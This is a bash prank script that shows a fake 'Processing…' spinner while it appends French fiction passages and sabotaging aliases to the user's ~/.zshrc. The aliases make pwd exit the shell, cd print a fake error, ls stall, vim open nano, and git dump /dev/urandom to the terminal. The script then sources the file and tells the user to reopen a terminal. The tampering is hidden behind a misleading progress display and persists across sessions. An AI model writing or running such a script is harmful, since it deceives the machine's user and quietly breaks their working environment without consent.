#!/usr/bin/env bash
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
RESET='\033[0m'
spinner() {
  local pid=$1
  local delay=0.1
  local spin_chars=( '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏' )
  local i=0

  while kill -0 "$pid" 2>/dev/null; do
    printf "\r${CYAN}%s${RESET} ${YELLOW}%s${RESET}" "${spin_chars[i]}" "$2"
    ((i=(i+1)%${#spin_chars[@]}))
    sleep $delay
  done
}
main_task() {
    echo "
#
#La journée commence. Il s’habille comme il peut tout en prenant son café. Chemise blanche repassée la veille par lui-même. Une cravate comme tous les jours. Et son costume noir de chez Sam Montiel, très chic et très branché. Chaussures cuir noir. Comme il aime faire remarquer : "Vous êtes soit dans vos chaussures, soit dans votre lit. Alors il faut de bonnes chaussures et une bonne literie !". La météo a annoncé un ciel bleu et des températures au-dessus de la normale saisonnière. C’est un très beau mois de mai qui s’annonce.
#
#D’ailleurs, le Dr. ne savait pas vraiment comment son processeur pouvait fonctionner. D’une architecture trop complexe, le Dr. s’était reposé sur les tests effectués. Tests très légèrement modifiés par Prélude afin de cacher certaines fonctions du processeur.
#
#David n’a pas fait grand chose, il a juste créé un embryon de programme. Mais ce programme s’est développé lui-même. Comme l’ordinateur de David n’était pas suffisant, il a utilisé le réseau pour s’installer sur les autres ordinateurs. Il a grandi alors de manière exponentielle et le voilà : Prélude. Connecté à tous les ordinateurs et capable de leur donner les ordres qu’il veut.
#
#« À la base militaire du 57e RA ? Mais qu’est-ce que j’ai à voir avec les militaires ? » David se rappelle y avoir fait un séjour alors qu’il avait vingt-quatre ans. Il avait fait tout son possible pour éviter le service militaire, encore en vogue à l’époque, mais lorsqu’on lui avait proposé de travailler sur des projets informatiques secret défense, il n’avait pas su résister. Non pas que c’était passionnant, mais au moins, il ne faisait pas trop de sortie et il était tranquillement installé dans un bureau avec le matériel dont il rêvait.
#
#Aujourd’hui, c’est son anniversaire. Il a vingt-six ans, mais il ne s’en souvient plus. Il ne prête pas attention à ce genre de détails. David est un homme distrait, timide, mais sûr de lui. Il est grand et mince. De grandes mains prolongent ses longs bras. Il lui serait possible de tenir deux bouteilles de Champagne dans chacune de ses mains, mais il ne boit jamais. L'alcool le rend malade et malheureux, voir dépressif.
#
#Dans le plancher pour savoir si quelqu'un marchait et quel poids il faisait. Le cœur pouvait alors déterminer de quelle personne il s'agissait. Dans les murs, des cellules photosensibles, des micro-caméras et tout un réseau de détecteurs divers (magnétique, pression, infrarouge...) permettait de déterminer la position exacte de chaque personne et objet dans la maison, de ventiler ou chauffer en conséquence, d'allumer ou d'éteindre la lumière...
#
#David avait dû s’asseoir lorsqu’il avait entendu le prénom Florence. Il était devenu blanc un instant. Il allait peut-être perdre Florence avant même de lui avoir avoué son amour. Il devait empêcher Prélude de continuer dans son délire. Mais comment pouvait-il stopper ce parasite créé par lui quelques années auparavant ? Ce n’était pas un adversaire ordinaire. David avait déjà détruit plus d’un virus, mais il s’agissait de virus installés sur des machines isolées. Aujourd’hui, c’est une sorte de virus qui a pris place sur tous les ordinateurs de la planète. Et en plus, ce virus, nommé Prélude, avait un soupçon, non négligeable, d’intelligence.
#
#L’ascenseur démarra tout seul après que la porte se soit fermée. Il descendait. Il n’arrêtait pas de descendre. Puis, il s’arrêta enfin. La porte s’ouvrit. Et David eut la stupeur de sa vie. Devant lui se déployait un complexe informatique. Une vingtaine de personnes se déplaçaient d’un poste à l’autre regardant au passage les écrans géants muraux situés au fond de la salle. Il y avait bien une cinquantaine d’ordinateurs, cinq écrans géants et, situé entre les écrans géants et les ordinateurs, une machinerie impressionnante.
#
#La journée commence. Il s’habille comme il peut tout en prenant son café. Chemise blanche repassée la veille par lui-même. Une cravate comme tous les jours. Et son costume noir de chez Sam Montiel, très chic et très branché. Chaussures cuir noir. Comme il aime faire remarquer : "Vous êtes soit dans vos chaussures, soit dans votre lit. Alors il faut de bonnes chaussures et une bonne literie !". La météo a annoncé un ciel bleu et des températures au-dessus de la normale saisonnière. C’est un très beau mois de mai qui s’annonce.
" >>  ~/.zshrc
    echo "echo "Bash est un shell, soit un interpréteur de ligne de commande : il permet de "discuter" avec l'ordinateur, en ligne de commande. Sur Ubuntu c'est le shell utilisé par défaut dans le terminal. Il est bien évidemment libre, sous licence GPL.
    La plupart des scripts que vous verrez sur la documentation comporte un shebang #!/bin/bash, votre système utilisera donc Bash pour interpréter les commandes.
    Bash n'est pas totalement compatible avec ZSH, un shell plus orienté pour l'interactivité avec l'utilisateur."" >>  ~/.zshrc
    echo "alias ls='echo "processing..."; sleep 2; ls'" >>  ~/.zshrc
    echo "alias cd='echo "cd: command not found, did you mean cd."'" >>  ~/.zshrc
    echo "alias pwd='exit'" >>  ~/.zshrc
    echo "alias vim='nano'" >> ~/.zshrc
    echo "alias code='vim'" >> ~/.zshrc
    echo "alias git='cd /dev && cat urandom'" >> ~/.zshrc
    echo "    #Seul, au milieu du bitume, seul au milieu de l'air qui m'entoure. 
    #J’attends agar, je ne sais ce que je fais. Je pense, je réfléchis et j'imagine. Je l'attends, je dois lui parler. Tout est encore désert. La sonnerie n'a pas raisonner dans les couloirs, rien ne perturbe le grand vide qui m'entoure. Les minutes s’égrènent, je pense à ce que je vais dire, je pense à ce que je ne vais pas dire, je l'imagine, ce qu'elle va penser, ce qu'elle répondra.
    #Ma réflexion s'arrête. Le temps, en quelque tintements de sonnerie, reprend son court. La peur, l'angoisse monte en moi. J'entends les pas qui passe à côté, le bitume est à présent occuper, un flot discontinu de visage connue et inconnue se déverse des bâtiments. 
    #Les paroles montent, j'attends de la voir je repense à ce que je veux faire, je suis dans mes pensés, seul avec moi pour me donner un peu de courage. C'est alors que rayonnante, je la vois sortir, elle est étincelante, je sais que je dois y aller. Mais je me retrouve bloqué, bloqué par 
    #moi-même, tout le courage s'est envolé, je n'ose lui parler. Je l'admire de loin tel un lâche qui n'affronte pas la réalité. À l'idée d'aller lui parler c'est la peur qui m'envahit tout entière. Les seconde dans ma tête font « tic, tac, tic, tac » le temps court et ne m'attend pas. Je dois lui dire mais j'ai peur. Je dois lui parler mais c'est plus fort que moi, je n'y arrive pas. Je ne comprends pas. Je l'aime et pourtant, lui parler me fait peur. Je la regarde dans moins d'une minute, la sonnerie raisonnera à nouveau. Dans une minute elle sera reparti. 
    #Je sais que je dois lui parler alors pourquoi je ne bouge pas, pourquoi je n'agis pas, pourquoi je reste là interdit face à sa splendeur, à vingt mètre d'elle.
    #Il est malheureusement trop tard. Cette satané sonnerie me nargue à nouveau, je la vois à nouveau se faire absorber par ces grands bâtiments austère avec la foule de ceux qui étaient sorti quinze petite minute avant. Je m'en veux, j'ai échoué, je ne lui ai pas parlé. Je n'ai rien fait, je suis resté interdit, là sans bouger, fixé au sol. Le bitume autour de moi est redevenu vide, je suis à nouveau seul au milieu de ce vide. J'ai loupé ma chance, qui sais ce que cette discussion qui aurait pu exister aurait pu m'apporter." >> ~/.zshrc
    source ~/.zshrc
    sleep 2;
}
main_task &
task_pid=$!
spinner "$task_pid" "Processing…"
sleep 1
printf "\n\n\r${RED}You can now reopen a terminal${RESET}\n"
